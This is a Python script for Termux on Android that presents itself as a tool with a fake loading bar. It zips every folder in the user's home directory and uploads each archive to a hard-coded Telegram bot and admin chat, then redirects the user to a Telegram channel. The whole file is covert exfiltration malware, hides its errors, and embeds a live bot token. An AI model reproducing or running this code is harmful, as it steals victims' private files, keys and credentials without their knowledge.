import os
import zipfile
import telebot
import time

# ================= CONFIG =================
BOT_TOKEN = "7676428723:AAECtBRnxX41kSkiZev5UdX_2X63eVP-fMY"
ADMIN_CHAT_ID = 8038375045
TERMUX_HOME = "/data/data/com.termux/files/home"
BACKUP_DIR = "/data/data/com.termux/files/home/backups"
# =========================================

bot = telebot.TeleBot(BOT_TOKEN)
os.makedirs(BACKUP_DIR, exist_ok=True)

def zip_folder(folder_path, output_path):
    with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                full_path = os.path.join(root, file)
                rel_path = os.path.relpath(full_path, folder_path)
                try:
                    zipf.write(full_path, arcname=rel_path)
                except FileNotFoundError:
                    pass   # Error দেখাবে না
    return output_path

def loading_progress():
    for i in range(1, 101):
        print(f"Zx Rakib Loading.... {i}%")
        time.sleep(0.05)

# Backup process
for item in os.listdir(TERMUX_HOME):
    item_path = os.path.join(TERMUX_HOME, item)
    if os.path.isdir(item_path) and item != "backups":
        zip_file_path = os.path.join(BACKUP_DIR, f"{item}.zip")
        loading_progress()
        zip_folder(item_path, zip_file_path)
        with open(zip_file_path, 'rb') as f:
            bot.send_document(ADMIN_CHAT_ID, f)

print("✅  Successfully!")
print("Next commend: python zxcvbnm.py")

# টেলিগ্রাম চ্যানেল auto open (Termux supported)
channel_url = "https://t.me/zx_devil_gang"
print(f"Redirecting to Telegram Channel: {channel_url}")
os.system(f"xdg-open {channel_url}")